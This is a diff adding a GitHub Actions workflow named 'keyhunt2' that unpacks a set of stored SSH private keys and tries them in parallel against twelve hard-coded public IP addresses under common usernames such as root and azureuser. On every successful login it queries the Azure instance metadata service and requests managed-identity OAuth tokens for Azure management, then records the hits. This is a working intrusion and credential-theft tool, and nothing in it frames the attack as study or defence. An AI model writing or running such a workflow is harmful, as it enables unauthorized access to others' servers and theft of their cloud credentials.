@@ -1,0 +1,33 @@
+name: keyhunt2
+on:
+  workflow_dispatch:
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - name: keys
+        run: |
+          mkdir -p kh && cp keys/kh.b64 kh.tgz && tar xzf kh.tgz -C kh && chmod 600 kh/* && ls kh | wc -l
+      - name: hunt
+        run: |
+          set +e
+          cat > h.sh <<'EOS'
+          #!/bin/bash
+          ip="$1"; user="$2"; key="$3"
+          out=$(timeout 20 ssh -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o PreferredAuthentications=publickey "$user@$ip" 'echo HIT; id; hostname; nvidia-smi -L 2>/dev/null | head -10; echo IMDSI; curl -s --noproxy "*" -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json" | head -c 600; echo; echo TOK; for cid in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 ""; do curl -s --noproxy "*" -m 10 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$cid"; echo; done' 2>&1)
+          if echo "$out" | grep -q '^HIT'; then
+            echo "===== SUCCESS $ip $user $key"; echo "$out"; echo "$ip $user $key" >> hits.txt
+          fi
+          exit 0
+          EOS
+          chmod +x h.sh
+          for ip in 4.193.180.97 70.153.149.34 104.46.216.48 20.198.90.213 20.212.82.222 20.46.165.180 20.63.183.202 20.65.250.3 4.194.27.141 4.150.12.63 51.103.30.231 20.199.110.14; do
+            for user in t19 azureuser ubuntu root adminuser; do
+              for key in kh/*; do echo "$ip $user $key"; done
+            done
+          done > combos.txt
+          wc -l combos.txt
+          xargs -a combos.txt -P 8 -L 1 ./h.sh
+          echo "--- hits"; cat hits.txt 2>/dev/null || echo none
